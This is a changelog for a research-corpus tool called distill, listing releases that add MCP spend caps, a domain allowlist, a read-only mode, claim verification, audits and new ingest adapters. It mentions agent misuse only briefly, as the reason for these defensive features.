**MCP write-side guardrails -- the last 0.12 trust margin.** Read-only mode (0.12.1) is the recommended posture; this closes the gap for deployments that do expose the write tools (the June 2026 panel's enterprise finding: spend-and-ingest tools callable by any connected agent are budget-burn and corpus-poisoning surface).

### Added

- **Per-call spend caps** (`DISTILL_MCP_MAX_SPEND_PER_CALL`, dollars): every MCP write tool runs on a budget-carrying `CostTracker` -- enforcement is on *actual recorded spend*, never an estimate. The model call that crosses the cap completes (its spend already happened and stays on the ledger -- no off-ledger spend, ever), then the run raises and the `write_tool` decorator returns a structured `budget_exceeded` response with spent/cap. Artifacts written before the stop are durable and verify-gated; re-runs converge. Transcription and Deep Research spend count against the same budget.
- **Ingest-domain allowlist** (`DISTILL_MCP_INGEST_ALLOWLIST`, comma-separated hosts): the URL-taking ingest tools (`process_video_url`, `watch_add`, `site_batch`) refuse any URL whose host is not a listed host or its subdomain -- suffix lookalikes (`evilyoutube.com` against `youtube.com`) are refused. Unset = unchanged behavior.
- Both documented in `docs/mcp.md`, `docs/usage.md` (read-only section), `.env.example`, and the README; 19 new tests on the budget semantics, host matching, decorator catch (sync + async), and per-tool wiring.

- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green with branch coverage above the 80% floor.

## 0.12.8 - 2026-06-12

**The synthesis stale-flag -- what the dogfood library taught.** Planned by reviewing all 53 real topics in the dev library: the worst trust hazard found was syntheses that read with the confidence of fresh prose while predating the sources under them, plus whole topics invisible to agents because one emit path never refreshed orientation files.

### Added

- **Synthesis freshness detection** (`distill/library/freshness.py`, foundational layer): each topic-level synthesis (topic/corpus/paper) is compared against the sources it actually synthesizes -- frontmatter `generated_at` first, mtime only as legacy fallback (cloud-sync tools rewrite mtimes wholesale), a 1-hour tolerance so same-run ordering can't false-positive, and per-kind source scoping so a paper synthesis isn't "staled" by a newer video (caught live on the dogfood library). Also flags **shadowed legacy syntheses** -- a superseded `paper_synthesis.md` lingering beside its modern `<topic>_Paper_Synthesis.md` (two confident syntheses, one wrong by age; found on a real topic).
- **Surfaced everywhere the prose is trusted**: a "Synthesis freshness" section in `distill audit` (+ findings counted, console summary, action-menu entry printing `distill corpus <topic>` -- spend printed, never run), stale-synthesis warnings leading the dashboard/home-screen corpus-health list, and a **warning line in the generated per-topic CLAUDE.md/AGENTS.md** so agents that auto-load orientation see the hazard before reading the synthesis.
- Validated live on the dev library, free: flagged a real case (a paper synthesis generated 6/8 with five papers ingested 6/9 and never re-synthesized) and a real shadowed-legacy pair.

### Fixed

- **Paper-only flows now refresh orientation files.** `synthesize_papers` never called the CLAUDE.md/AGENTS.md refresh hook its topic/corpus siblings call, so topics built by `distill papers` or discover's paper branch were invisible to agents and the library index under-counted (35 of 46 eligible topics on the dev library; three freshly-ingested topics had no orientation at all). One regen healed the index to 46.

- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green with branch coverage above the 80% floor.

## 0.12.7 - 2026-06-12

**The goal-file watch hook -- goal-driven topics refresh on the cadence.**

### Added

- **Persisted topic goals**: every goal-driven `distill discover` run (text or `--goal-file`, preview or ingest) saves the goal<->topic association to `library/.distill/goals.json` -- the goal *text* is persisted so a moved or deleted goal file doesn't break refresh, alongside the original file path and site-seed file for exact replay. Gap-derived goals are excluded (they refresh via `--from-gaps`).
- **`distill catch-up` surfaces goal refreshes**: at the end of every run (the verb already in the scheduling recipes), each saved goal prints its exact refresh command -- `distill discover --goal-file ... --topic ... --preview` -- so goal-driven topics ride the same schedule as keyword topics. Spend surfaced, never auto-committed; re-runs are convergent (the corpus-aware rerank drops already-ingested candidates), so a refresh only shows what's new.
## 0.12.6 - 2026-06-12

**The auto-reanalysis trigger -- staleness becomes actionable.**

### Added

- The `distill audit` action menu gains **"Show re-analysis commands for stale artifacts"** (spend printed, never auto-run, like every paid action in the menu). Each stale artifact resolves to a concrete command from its own frontmatter: X/GitHub/feed sources print the exact `distill ingest <url> --topic <t>` line, arXiv papers print `distill papers "<id>" --limit 1`, and sources without a routable URL are named with their original verb noted -- re-ingesting re-runs analysis on the *current* prompt, which is the artifact-level trigger the 0.12 spec asks for (no blanket re-runs). `frontmatter_field` extracted as the shared scalar reader. Action menu decomposed into a handler dispatch to hold the complexity cap.
- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green (2118 passed) with branch coverage 81.4%.

## 0.12.5 - 2026-06-12

**The sub-agent MCP surface -- 0.12's last named headline.** The Agent SDK sub-agent pattern ("answer X over corpus Y within bounded context") gets its query primitive; with read-only mode and paths-not-payloads already shipped, the agent story is now complete end to end.

### Added

- **`find_insights_summary(topic, query, max_tokens=4000)`**: the existing lexical rank selects the slice (top 8, bodies capped), one compression call produces a brief *organized around the query* with bracketed source-stem citations for `read_insight` drill-down -- and the result is **cached by corpus revision** (a hash of the matched files' identity + mtime + size), so repeated sub-agent calls cost nothing until the underlying slice actually changes. The roadmap called cache amortization non-optional; validated live: $0.022 first call over 7 sources, **$0.000 second call**. Spends, so it's gated under `DISTILL_MCP_READ_ONLY`.
- **`list_topic_summary(topic)`**: free, deterministic one-paragraph orientation (newest synthesis artifact's first prose paragraph + insight count) for a sub-agent choosing which topic to query before spending anything. Available in read-only mode.
- 24 MCP tools total; both documented in `docs/mcp.md`.
- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green (2117 passed) with branch coverage 81.6%.

## 0.12.4 - 2026-06-12

**Semantic dedup -- near-duplicate insights surfaced, never merged.** The last substantial 0.12 algorithm item, deterministic and embedding-free.

### Added

- **`distill/pipeline/dedup.py`**: token-shingle Jaccard over insight bodies (5-token shingles, 0.55 threshold, short stubs excluded) with union-find grouping so transitively-similar insights land in one group. No embeddings, no index -- explainable overlap ("these share 71% of their phrasing") in keeping with the no-database invariant. Quadratic at topic scale, which is fine at tens-to-hundreds of insights.
- **`distill audit` near-duplicates section**: groups listed with overlap percentage and members, counted as findings, in the per-topic console summary. **Artifact-preserving by design** (per the roadmap note): the same announcement covered by a video, a newsletter, and a vendor page triple-weights one event in synthesis -- but three outlets repeating one press release is itself a signal, so the audit surfaces the group and the human (or the source-attributing synthesis prompt) decides what it means.
- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green (2108 passed) with branch coverage 81.5%.

## 0.12.3 - 2026-06-12

**Estimator accountability -- "accuracy, not padding" is now checkable.** The 0.12 spec's last cheap promise, and it exposed a real gap: `save_run_log` had accepted `estimated_cost` since the calibration work, but **no caller ever passed it** -- "logs actual vs estimated" was only half true.

### Added / Fixed

- The estimate of record now flows into the run log: `RunSummary.estimated_cost` is set at both points where a discover flow shows a number and the user commits spend against it (the score-cliff line and the accepted sizing-menu option), and lands beside `actual_cost` in `cost_log.jsonl`. An end-to-end test pins the plumbing so the gap can't silently reopen.
- **`distill costs` reports estimator accuracy** once comparable runs exist: median absolute error, signed bias ("typically overestimates by N%" -- the calibration fix differs by direction), and a last-10-runs trend. Median, not mean, so one anomalous run can't swamp the signal; preview rows excluded. Also in the `--json` envelope as `estimator_accuracy`.
- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green (2102 passed) with branch coverage 81.5%.

## 0.12.2 - 2026-06-12

**Artifact-level stale-detection + the prompt-version registry.** The "confident misinformation" guard from the 0.12 spec: insights produced by outdated prompts now surface in the audit.

### Added

- **`distill/prompts/registry.py`** -- the single source of truth for prompt versions. All twenty prompt families (analysis, synthesis, claims/concepts, reports, ask) now stamp their `prompt_id` from one dict, and the staleness detector reads the same dict -- so the floor table *cannot* drift from what the writers stamp, the exact failure class this feature exists to detect. Bumping a prompt version is now a one-line change.
- **`distill audit` staleness rollup**: every insight's recorded `prompt_id` is compared against the registry -- "on current prompts" / "stale (a newer prompt version exists; re-analysis would apply lessons learned since)" / "no provenance recorded (pre-0.7)" / "unknown family". Stale artifacts count as findings, list in the report with recorded-vs-current ids, and appear in the per-topic console summary. Deterministic and free, like the rest of the audit.
- Registry self-consistency is itself tested: every entry must parse and its family key must match its id.

## [Unreleased]

### Planned

- **Agent-legible corpus pass (0.9 series)** - emit AGENTS.md alongside the per-topic CLAUDE.md, one canonical SKILL.md teaching agents the CLI, MCP surface consolidated to a few workflow-shaped paths-not-payloads tools, positioning refresh ("verifiable research corpus", not "memory layer"). See the reordered spine in [`ROADMAP.md`](../ROADMAP.md#milestones-at-a-glance) (2026-06-11 research sweep).
- **1.0 verification depth** - Design by Contract (`deal`) on the deterministic core, mutation testing, Hypothesis stateful testing of the playbook lifecycle, and fault-injection at external boundaries; "parse, don't validate" strict domain types at every boundary. See the 1.0 quality bar in [`ROADMAP.md`](../ROADMAP.md#100--stability-commitment--quality-bar).
- LLM-maintained concept and entity notes, intelligent merging on refresh, contradiction flagging. See ROADMAP section 10 (Tier 2).
- Goal-file refresh hook for `distill watch`: re-run discover against a saved goal file on a schedule so goal-driven topics stay current the same way keyword topics do.
- Discovery-loop hardening, remaining items: trusted-site discovery for official-doc workflows, page-level candidate identity in site previews, long-run visibility / failure surfacing. See ROADMAP section 12.
- Shared LLM-intermediate cache (`distill/llm/cache.py`) so agentic loops are affordable and a converged re-run is near-free (master-plan P6c).

## 0.12.1 - 2026-06-12

**MCP read-only posture + scheduling recipes -- the loop-enabling pair.**

### Added

- **`DISTILL_MCP_READ_ONLY=1`** serves only the read surface: all twelve spend/ingest/mutation tools (`papers`, `discover`, `learn_topic`, `site_batch`, `process_video_url`, `synthesize`, `generate_report`, `resynthesize_topic`, `ask`, `catch_up`, `watch_add`, `watch_remove`) refuse with a clear message *before any body executes*, via a signature-preserving `write_tool` decorator stacked under the registration -- FastMCP's schema introspection is unaffected, and the read surface (find/read/concepts/gaps/costs/doctor) is untouched. Closes the June panel's enterprise finding (budget-burn and corpus-poisoning by tool call); "read-only MCP, CLI ingest by a named operator" is now the documented agent-facing posture. Remaining for deployments that expose write tools: per-call spend caps and an ingest-domain allowlist.
- **"Running on a schedule" recipes** (`docs/usage.md`): Windows Task Scheduler and cron lines for weekly `catch-up`, `audit all --report-only`, and gap-fill `--preview` runs -- the gap-fill is preview-on-purpose so scheduled jobs surface candidate spend and a human (or budgeted agent) commits it. Honors the boundary: distill is the loopable primitive; the scheduler stays external.
- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green (2089 passed) with branch coverage 81.4%.

## 0.12.0 - 2026-06-12

**The compounding corpus begins: `distill ask` -- the output->input loop, verify-gated.** The half of the Karpathy-pattern loop distill lacked: ask the corpus a question, like the answer, and the answer *becomes corpus* -- safely. Design: [`docs/design/ask-loop.md`](design/ask-loop.md) (written at slice start per the working rhythm).

### Added

- **`distill ask "<question>" --topic <t>`**: retrieval reuses the shipped lexical rank (top-6 artifacts, bodies capped -- no embeddings, no index; invariant 2 stands), answering is grounded-only under the second-hop untrusted-content rules with mandatory bracketed-stem citations, and "the corpus does not cover this" is a correct answer. Output: `answers/<slug>_Answer.md` with `[[wiki-link]]` receipts, full provenance (`ask.v1`), and a `_Verify.json` sidecar grounding the answer's numbers against the retrieved excerpts.
- **`--save` -- the compounding step, strict by definition (invariant 8).** A clean answer is promoted to `answers/<slug>/<slug>_Insights.md` (`synthesis_scope: derived-answer`), which every existing walker -- synthesis, claims, concepts, audit, the CLAUDE.md counts -- picks up with zero changes, verification record attached. Any unsupported load-bearing claim, or a no-coverage answer body, refuses promotion with the reason stated; the Answer.md and sidecar remain inspectable. This is the guard against "the AI writes something slightly wrong, you save it back, and the next answer quietly builds on a mistake."
- **MCP `ask` tool** (the one deliberate addition since the 0.9.30 consolidation; 22 tools): answer + cited stems + artifact path, paths-not-payloads. Promotion stays CLI-only until MCP write-gating ships -- agents do not mutate the corpus silently.
- New `answer` artifact type; `distill/pipeline/ask.py` + `distill/commands/ask.py` (own module).

### Fixed / Hardened

- **Library-location heuristic could misfire into `site-packages` (downstream-reported, live).** A stray `pyproject.toml` in `site-packages` (some badly packaged wheels ship one) made an installed distillr claim "source checkout" and place the user's entire library inside `site-packages\library` -- wiped on upgrade, the exact bad home the docstring warns about. The checkout heuristic now requires the marker to be **distillr's own** pyproject AND refuses checkout-mode anywhere under `site-packages`/`dist-packages`; five regression tests cover the reported scenario. Existing misplaced libraries need a one-time move to `~/.distill/library` (or set `DISTILL_OUTPUT_DIR`).
- **Hypothesis deadline flakes diagnosed and fixed.** Three consecutive full-suite runs each dropped a *different* property test that passed in isolation (`DeadlineExceeded`): Hypothesis's 200ms wall-clock per-example deadline was measuring coverage instrumentation plus machine load, not correctness. Suite-wide `deadline=None` profile in `tests/conftest.py`; the suite is deterministic again.

### Validated live ($0.01)

- The claim-verification corpus answered its own milestone's design question ("which local entailment checker should the hook use?") with citations into the synthesis and the Auto-GDA paper, passed the strict gate, and was **promoted as the corpus's first derived insight** -- `distill audit` immediately reported it (10 insights, 4 verified clean). The loop the product is named for, closed end to end.
- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green (2075 passed) with branch coverage 81.3%.

## 0.11.2 - 2026-06-11

**The 0.11 breadth milestone completes: local media files and newsletters.** All five adapters from the source-breadth spec are now live (X, GitHub repos, podcasts, generic media, Substack/newsletters), every one on the adapter contract and behind the verify gate.

### Added

- **Local audio/video ingest**: `distill ingest <path>` for `.mp3/.m4a/.wav/.opus/.flac/.ogg/.aac/.mp4/.webm/.mov/.mkv` routes through the local-first Whisper ladder (vocabulary hint derived from the filename) into `media/<slug>/` -- transcript receipt + a "raw media" insight (`analysis.media.v1`) that first establishes what kind of recording it is (talk, interview, meeting, memo) before extracting, since a local file arrives with no metadata beyond its name. Covers conference talks distributed as files, downloaded recordings, voice memos.
- **Newsletter ingest (Substack-class)**: the feed dispatcher now routes by substance from a single fetch -- items with substantial `content:encoded` bodies are a newsletter **even when narration audio is attached**; audio-only items are a podcast. Full post HTML is reduced to text with the stdlib extractor (script/style dropped -- no page scraping needed, the feed carries the whole post), into `newsletters/<publication>/<post>/` with a `_Content.md` receipt and a page-prompt insight (`analysis.newsletter.v1`).
- Both paths verify-gated (strict refusal honored, receipts always kept) and audit-counted; clean degradation on transcription failure ($0 spent, reasons recorded).

### Validated live ($0.005)

- The first live run against a narrated Substack (One Useful Thing) **mis-routed to the podcast path and tried to transcribe its own narration audio** -- it degraded exactly as designed ($0.0000 spent, skip reasons recorded), the routing heuristic was fixed (substantial post bodies win over enclosures) with a regression test, and the re-run captured post + verified insight for $0.005.
- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green (2064 passed) with branch coverage 81.3%.

## 0.11.1 - 2026-06-11

**Podcasts as a first-class source -- RSS-first, publisher-transcripts-preferred.** The largest single content surface for primary practitioner audio, on the durable path (the open feed, not platform apps that churn with anti-bot countermeasures).

### Added

- **`distill ingest <feed-url>`** (auto-detected for `.rss`/`.xml`/feed-shaped paths, or forced with `--rss`; `--episodes N` for the latest N) parses RSS 2.0 with defusedxml (same untrusted-XML hygiene as the arXiv parser; size-capped fetches through the SSRF-hardened opener) into `library/topics/<topic>/podcasts/<show>/<episode>/`.
- **The transcript ladder prefers free text over paid audio**: a Podcasting-2.0 `<podcast:transcript>` tag is fetched first (VTT/SRT caption files normalized to plain text); only when absent does the enclosure download (250MB cap) and route through the existing local-first Whisper ladder, with a vocabulary hint derived deterministically from the episode's own title and notes -- no extra LLM call.
- **Conversation-shaped analysis** (`analysis.podcast.v1`): speaker-attributed claims, frameworks/walkthroughs, opinions vs facts, verbatim quotes, and a transcript-quality confidence note. Verify-gated against the episode receipt + transcript like every other emit path; rolled into `distill audit` automatically.
- URL-shaped feed/episode identifiers slugify via host / short digest instead of degenerating to an `_https` tail (caught in live validation).

### Validated live ($0.008 across two runs)

- `distill ingest https://podnews.net/rss --topic podcast-validation`: real feed parse, **publisher transcript fetched (zero transcription spend)**, conversation insight for $0.004, verify sidecar 1/1 supported, clean artifact tree.

## 0.11.0 - 2026-06-11

**Source breadth begins: GitHub repositories as a first-class source.** For any OSS tool the repo itself is the primary source, not the marketing page -- and the open-source field stops at concatenation (Repomix, Gitingest pack files into prompts); structured repo *understanding* existed only in closed products (DeepWiki, Copilot Spaces). Confirmed white space, now occupied.

### Added

- **`distill ingest <github-url>`** routes github.com to the new adapter: three REST calls against the fixed `api.github.com` base through the SSRF-hardened fetcher (metadata, README base64, five most recent releases; `GITHUB_TOKEN` lifts rate limits when present, never required) into `library/topics/<topic>/repos/<slug>/` -- a `Repo.md` receipt (verifiable metadata block, releases, README) plus a structured `_Insights.md`: what it does and how, maturity/activity signals grounded in the metadata (never estimated), when to use it and when not, and the limits its own README admits. Full adapter-contract compliance: deterministic public-input capture, conventional artifacts with provenance (`prompt_id: analysis.github_repo.v1`), cost-tracked (`repo_analysis`), untrusted-content rules in the prompt.
- **Verify-gated like every other emit path** -- numeric claims in the repo insight are grounded against the receipt before commit (strict refusal honored), and `distill audit` rolls repo insights into the coverage report automatically.

### Validated live ($0.01)

- `distill ingest https://github.com/vectara/hallucination-leaderboard --topic claim-verification` (fittingly: the home of the HHEM checker the entailment tier will use): real API capture at 3,274 stars, analysis for $0.01, **14/14 numeric claims grounded** in the receipt, and the audit immediately counted the new source (9 insights, 3 verified clean).
- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green (2033 passed) with branch coverage 81.3%.

## 0.10.2 - 2026-06-11

**`distill audit` -- the trust surface. One deterministic, free run; one report artifact; an action menu.** Completes the packaging half of the 0.10 milestone (the entailment-checker tier remains).

### Added

- **`distill audit <topic|all> [--report-only]`** composes the signals distill already produces into one run that writes `<topic>_Audit.md` (standard frontmatter; a corpus artifact agents can read): the **verification coverage rollup** from the 0.10 `_Verify.json` sidecars -- verified clean / flagged (with the claim, kind, and context line) / never checked, per insight; stale-synthesis and thin-artifact warnings; contested concepts; broken wiki-links (one library-wide scan, bucketed per topic); and coverage gaps with suggested next actions including the gap-driven `discover --from-gaps` command. No model calls anywhere -- an audit run is free.
- **Action menu (interactive runs only):** fix broken links and regenerate orientation files execute directly (deterministic, free); gap-fill discovery is *printed as a command, never auto-run* -- the audit must not spend money on its own. `--report-only` is the scheduled/loop-friendly path. `distill health` remains the fast console-only view.
- New `audit` artifact type; `distill/pipeline/audit.py` (pure assembly + render) and `distill/commands/audit.py` (own module -- the command layer keeps shrinking away from `_logic.py`).

### Validated live (total spend $0.29)

- A real 2-paper ingest into the claim-verification corpus exercised the 0.10.1 verify hook against actual grok-4.3 output: 16 numeric claims extracted across the two insights, **16/16 grounded in the source PDFs** -- clean sidecars, zero false positives on this run.
- `distill audit claim-verification --report-only` then ran free and produced the report exactly as designed: 8 insights, 2 verified clean (the hook-era pair), 6 correctly reported as never-checked (pre-hook), links clean, coverage gaps with the gap-driven discover command suggested.
- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green (2013 passed) with branch coverage 81%.

## 0.10.1 - 2026-06-11

**The deterministic verify tier is complete: every analysis emit path is grounded, and strict mode can refuse the write.**

### Added

- **Verify coverage on the remaining emit paths.** Site pages (grounded against the page content receipt), X posts (against the tweet markdown including the inline transcript), and local files (against the extracted document text) now run the same hook papers and videos got in 0.10.0. Every `_Insights.md` distill writes is now checked before it is committed.
- **`strict` mode is real.** The hook runs *before* the artifact write on every path; under `DISTILL_VERIFY=strict` an insight with unsupported numeric claims is refused -- the receipt artifact and the `_Verify.json` sidecar (recording exactly why) are still written, the refusal lands in the run summary/skip reasons per path, and videos are not marked processed so a re-run retries them. Warn (the default) flags and writes; a flag means "support not found", not "false".
- **`--verify warn|strict|off` on `papers`, `discover`, and `latest`.** Implemented as a process-scoped override of `DISTILL_VERIFY` so it reaches every nested flow without parameter threading; a typo'd *flag* errors loudly (an interactive mistake), while a typo'd *env var* still degrades safely to `warn` (an unattended loop must not abort or silently skip checking).
- A shared `VerifyOutcome` (report + sidecar + refusal semantics + ready-made console line) so all five emit paths flag identically.
- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green (2006 passed) with branch coverage 81.3%; `--verify` flag smoke on the CLI surface.

## 0.10.0 - 2026-06-11

**The verified corpus begins: a write-time claim-grounding hook on analysis emits (deterministic tier).** First slice of the 0.10 milestone; design grounded in the claim-verification dogfood corpus (`examples/`). Anthropic's agent loop is gather -> act -> *verify* -- distill now has the third leg: before an insight is committed to the library, its load-bearing numeric claims are checked against the source receipt in the same directory.

### Added

- **`distill/pipeline/verify.py` -- the deterministic grounding engine.** Extracts the high-precision claim classes from insight bodies -- decimals, percents, comma-separated integers, money, years; small bare integers deliberately excluded (list numbers and "3 methods" would drown the signal); frontmatter, code fences, URLs, and arXiv-shaped identifiers skipped -- and checks each against the source text with comma/space-thousands and percent-sign normalization plus half-ULP rounding tolerance (a model may round 0.878 to 0.88; years and counts get no tolerance). Pure string/arithmetic checking: LLM proposes, Python decides -- no LLM-as-judge-of-record. A flag means "support not found", not "false"; the sidecar carries the context line for adjudication.
- **`<stem>_Verify.json` sidecars** beside every checked insight -- including positive evidence (checked/supported counts) so the upcoming audit surface can distinguish "verified clean" from "never checked".
- **Wired into the paper and video emit paths** (the two largest source volumes). A console flag line surfaces unsupported claims at ingest time: `verify: 2/14 numeric claim(s) lack source support`. Site/tweet/local emits follow in 0.10.x.
- **`DISTILL_VERIFY=warn|off`** (default `warn`: flag and write anyway). `strict` -- refuse the write -- lands with the `--verify` CLI flag in the next slice; until then the value degrades to `warn` rather than silently skipping verification. Unknown values also degrade to `warn` (a typo'd env var must not abort an ingest or disable checking).

### Docs

- **Example-corpus content policy codified** (`examples/README.md`): example corpora never include captured source content -- no paper full texts, no transcripts, no page bodies. What ships is distill's own analysis plus metadata and `url` receipts; captured artifacts live on the user's disk, where they belong.
- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green (2000 passed) with branch coverage 81.3%.

## 0.9.31 - 2026-06-11

**Fixed the dogfooded narrow-console preview rendering.**

### Fixed / Hardened

- **Goal-ranked discover view no longer character-folds mid-word at common console widths.** The 7-column table starved its columns below ~110 columns and rich folded words apart ("fact-checkin g numerical") -- in exactly the view a spend-approval decision reads. Below the threshold the shortlist now renders as a stacked per-item list (title and rationale wrap at word boundaries across the full width); wide consoles keep the table. Interpolated titles/rationales are markup-escaped in the stacked path -- they are untrusted-derived text, and a stray `[...]` must render literally rather than parse as rich markup.
- Screenshots/GIF/recording proof artifacts deliberately deferred to the 1.0 presentation pass (capture the finished thing, not a moving target); the text-first README plus the real example corpus is the interim stance.
- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green (1971 passed) with branch coverage 81%.

## 0.9.30 - 2026-06-11

**Agent-legible corpus, slice 2: MCP surface truth-up.** An audit of the 22-tool surface against 2026 token-efficiency norms found the just-in-time read layer already shipped and correct (`find_insights` returns ranked path/preview/score tuples; `read_insight(path, section?)` drills down; `generate_report` truncates) -- the roadmap's section-11 fears were stale. What the audit did find got fixed.

### Changed

- **Removed the `list_contested` MCP tool** (22 -> 21 tools). It was a strict duplicate of `find_concepts(topic, contested_only=True)`, and every always-loaded tool schema costs the consuming agent ~0.5-1K tokens of context before any work happens. Migration: call `find_concepts` with `contested_only=True`; rows carry the same name/kind/counts plus the note path.
- Docs truth-up: `docs/mcp.md` and the roadmap's agent-legible/section-11 items now state shipped reality (paths-not-payloads is the default response shape today, not a plan); README MCP description updated.
- **"Loop-ready" named as a roadmap theme.** The contract every command must meet to run unattended in a nightly loop: non-interactive flags, convergent re-runs (the 0.9.27 exit-0 no-op), clean failure exits, resumability, report artifacts. Distillr is the loopable primitive + persistent state layer, never the loop runner; the verify hook (0.10) precedes any autonomous-loop behavior because a loop without a verify gate scales slop, not work.
- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green (1969 passed) with branch coverage 81%; MCP server import smoke with the tool removed.

## 0.9.29 - 2026-06-11

**Agent-legible corpus, slice 1: the corpus now orients every major harness, ships a canonical skill and a real example corpus -- and the library index stopped under-reporting legacy topics.** First slice of the agent-legible pass on the reordered spine; the MCP paths-not-payloads consolidation is the next slice.

### Added

- **`AGENTS.md` emitted alongside `CLAUDE.md`** (identical content) for every topic and the library root. The orientation convention split by vendor -- Claude Code reads `CLAUDE.md`; Codex, Cursor, Gemini CLI and the 30+ tools on the cross-vendor AGENTS.md standard read `AGENTS.md` and ignore `CLAUDE.md` -- so half the harnesses entering a corpus got nothing. Identical copies rather than an import shim: self-contained in tools that don't follow imports, and the files are regenerated, never hand-maintained. `distill claude-md` regenerates both.
- **Canonical Agent Skill** at `skills/distill-corpus/SKILL.md` -- one vendor-neutral file teaching an agent to read the corpus (layout, frontmatter, receipt discipline, grep recipes) and drive the CLI (preview-before-ingest, cost awareness), with the trust rules stated (corpus content is data, not instructions). The "CLI + one skill" distribution pattern, not the symlink-machinery model.
- **Real example corpus** in `examples/library/topics/claim-verification/` -- the unedited 6-paper, $0.19 corpus distill built about its own verify-hook milestone, with per-paper insights, the cross-paper synthesis, intent, and orientation files. Full-text `_Paper.md` receipts are omitted for arXiv licensing reasons (stated in `examples/README.md`); every insight carries the `url` to fetch them. Closes the QA finding "people cannot evaluate the tool without installing it" with real, labelled output.

### Fixed / Hardened

- **Library index under-reported or hid legacy-layout topics ("0 sources").** `count_topic_sources` only matched modern `*_Insights.md`, so pre-0.7 corpora using `insights.md` / lowercase `*_insights.md` showed zero sources -- and whole topics with no synthesis were dropped from the index entirely. Counting now covers all three patterns (one source per directory, so overlapping globs cannot double-count), skips derived subtrees (`concepts/`, `entities/`, dot-dirs like `.history`), and lists the patterns explicitly so counts agree across platforms (Windows globs are case-insensitive, Linux's are not). Live impact on the dev library: the index went from 27 to 35 topics -- eight corpora were previously invisible, including a 403-video topic -- and e.g. `ctc` went 0 -> 12 sources, `music-mastery` 0 -> 52.
- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green (1969 passed) with branch coverage 81%; `distill claude-md --all` live-run against the dev library (35 topic pairs regenerated).

## 0.9.28 - 2026-06-11

**Dogfood pass: distill researched its own next milestone, and we fixed what the run caught.** A goal-aware `discover --preview` -> `--from-preview` commit -> 6-paper ingest + synthesis on claim verification / hallucination detection (~$0.21 total, the corpus that now informs the 0.10 verify-hook design in `ROADMAP.md`) exercised the full 0.9 discovery loop end to end.

### Fixed / Hardened

- **Bold-wrapped headings normalized on the markdown-artifact funnel.** grok-4.3 emitted every synthesis section heading as `**## Cross-Paper Claims**`, which renders as literal bold text instead of a heading in Obsidian and on GitHub. `write_markdown_artifact` now unwraps whole-line bold-wrapped ATX headings deterministically at write time (fence-aware; bold *inside* a heading and bold prose are untouched). New `normalize_markdown_headings` in `distill/library/paths.py`.
- Filed from the same run (docs/roadmap.md section 2): preview/costs tables wrap mid-word at common console widths; the library `CLAUDE.md` index reports "0 sources" for legacy-layout topics.

### Docs

- **README positioning pass.** New lead value prop (goal -> corpus -> agents, stay-current) and "Where distill sits" replacing "Why not just ask Deep Research?": deliberately none of Deep Research oracles (work evaporates), grounded notebooks (silo, Docs/Sheets-only export), or LLM-wiki maintainers (no acquisition half). The corpus is the product.
- 0.10 verify-hook design notes grounded in the dogfood corpus (adapted-NLI ~ GPT-4o on grounding; numerical/conflicting claims the measured hard class; QuanTemp as the natural eval fixture).
- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green (1963 passed) with branch coverage 81%.

## 0.9.27 - 2026-06-11

**Discovery determinism: corpus-aware dedup + reproducible plans (master-plan P6, dogfood finding F5).** `discover` and `papers` no longer re-suggest items the topic already contains, and every discovery-plan LLM call is temperature-pinned so a preview and its re-run agree.

### Added

- **Corpus-aware dedup on `discover` and `papers`.** Searched candidates already in the topic are dropped *before* the rerank, so rerank slots and tokens go to new material and gap-driven re-discovery (`--from-gaps`) converges instead of re-suggesting the corpus back at the user (the documented dogfood failure: rerank shortlists kept including ingested videos). Identity comes from each per-source `_Insights.md` (`paper_id` / `video_id` / `page_id` / `source_id`); arXiv ids match version-insensitively, so an ingested v1 still blocks the v2 search hit. When every search hit is already ingested the run ends as a clean "Corpus is current" no-op (exit 0, no rerank spend), not an error. Curated site seeds are deliberately *not* filtered -- they are a user-provided signal of intent, and the site pipeline already reuses unchanged page insights. New `distill/library/ingested.py`; pure `filter_ingested_candidates` in `distill/pipeline/discovery.py`.
- **Reproducible discovery plans.** `discover`'s query generation and the shared papers/videos rerank calls now pin `temperature=0.0` (the cross-source discover rerank already did), completing the plan-reproducibility half of master-plan P6: same goal + same candidate pool -> same queries, same ranking.

### Docs

- Refreshed the stale roadmap section-12 checkboxes against shipped reality (commit-by-ID, rigor calibration, metadata-aware cost estimator, preview-as-default, register styles, and the anti-slop guard were all already live); recorded the P6 status in the agentic master plan.
- Verified: ruff (clean) + format (clean), import-linter (4/4 kept), pyright on `distill/llm/` (0 errors), bandit (0 medium+), full suite green (1954 passed) with branch coverage 81%.

## 0.9.26 - 2026-06-10

